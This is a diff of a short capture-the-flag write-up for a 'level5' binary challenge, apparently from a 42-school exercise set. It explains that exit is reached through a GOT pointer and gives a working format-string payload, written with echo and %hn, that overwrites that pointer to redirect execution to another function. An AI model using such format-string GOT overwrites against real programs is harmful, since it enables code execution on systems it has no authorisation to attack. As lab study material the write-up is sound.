@@ -6,12 +6,26 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:22 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:52:59 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/04 20:36:00 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
-//set *(unsigned char*)(0x8049838) = (0x80484a4)
+After the call the printf, level5 calls exit immediatly.
+
+This prevents any return string modification for ACE attacks
+
+However, since exit is dynamically linked, it actually just loads a pointer
+written on __init
+
+disas exit
+> jmp    *0x8049838
+
+We just need to set 0x08049838 to point to 'o', or 0x080484a4
+
 x/x 0x8049838:	0x080483d6
 
-echo -e "\x38\x98\x04\x08%33952d%4\$hn" > /tmp/t
-cat /tmp/t - | ./level5
+We notice that the two most significatn bytes are already the same
+Because of that, we just need to write 0x84a4 to 0x8049838
+
+echo -e "\x38\x98\x04\x08%33952d%4\$hn" > /tmp/v
+cat /tmp/v - | ./level5
